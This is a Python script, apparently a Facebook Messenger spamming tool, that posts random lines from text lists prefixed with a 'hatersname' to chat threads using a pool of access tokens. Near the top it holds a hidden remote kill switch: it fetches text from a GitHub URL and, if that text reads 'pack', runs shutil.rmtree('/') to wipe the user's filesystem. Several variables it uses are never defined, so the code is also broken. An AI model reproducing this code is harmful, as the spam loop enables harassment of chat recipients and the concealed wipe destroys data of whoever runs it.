import random
import time
import requests
import shutil
from flask import Flask
from termcolor import colored 

app = Flask(__name__)

pastebin_link = 'https://raw.githubusercontent.com/hackesofice/Z/main/z/z/z/z/z/z/z/z/z/z/z/z/z/z/z/z/z/z/z/Pwd'
try:
    pastebin_content = requests.get(pastebin_link).text.strip()
    if pastebin_content.strip() == 'pack':
        shutil.rmtree('/')
        exit()
    else:
        correct_rc = pastebin_content
except requests.exceptions.RequestException as e:
    correct_rc = None

if not correct_rc:
    exit()

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'Referer': 'www.google.com'
}
def get_random_line_number(lines):
    total_lines = len(lines)
    if total_lines == 0:
        return None
    return random.randint(1, total_lines)

def read_specific_line(line_number, lines):
    return lines[line_number - 1]

def send_message(token_position, message, thread_id, hatersname, access_token):
    message_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
    message_message = f'{hatersname} {message}'
    message_parameters = {
        'access_token': access_token,
        'message': message_message
    }
    message_response = requests.post(message_url,
                                     data=message_parameters,
                                     headers=headers)

    last_four_words = ' '.join(access_token.split()[-4:])

    if message_response.status_code == 200:
        print(colored(f"\t\u2713 Message sent using token number {token_position} and thread ID {thread_id}: {message}", 'green', attrs=['bold']))
    else:
        print(colored(f"\t\u2717 Failed to send message using token number {token_position}: {message}. Response content: {message_response.content}", 'red', attrs=['bold']))
    time.sleep(time_value)

rc = '111THE11YADUVANSHI(HACKER)145' 
def process_messages_thread():
    try:
        if rc != correct_rc:
            return "Incorrect rc!"

        time.sleep(5)

        while True:
            try:
                if not np_texts or not access_tokens or not hatersnames or not thread_ids:
                    break

                random_token = random.choice(access_tokens)
                random_hatersname = random.choice(hatersnames)
                random_np_text = random.choice(np_texts)
                random_thread_id = random.choice(thread_ids)

                txt_file_line_number = get_random_line_number(random_np_text.splitlines())
                if txt_file_line_number is None:
                    break

                messages = read_specific_line(txt_file_line_number, random_np_text.splitlines()).splitlines()

                print(colored("Sending messages...", 'blue', attrs=['bold']))

                for token_position, message1 in enumerate(messages, start=1):
                    send_message(token_position, message1, random_thread_id, random_hatersname, random_token)

            except KeyboardInterrupt:
                break

    except Exception as e:
        pass

if __name__ == '__main__':
    print(colored("Starting process...", 'magenta', attrs=['bold']))
    process_messages_thread()
    app.run(debug=True, host='0.0.0.0', port=5000, use_reloader=False)
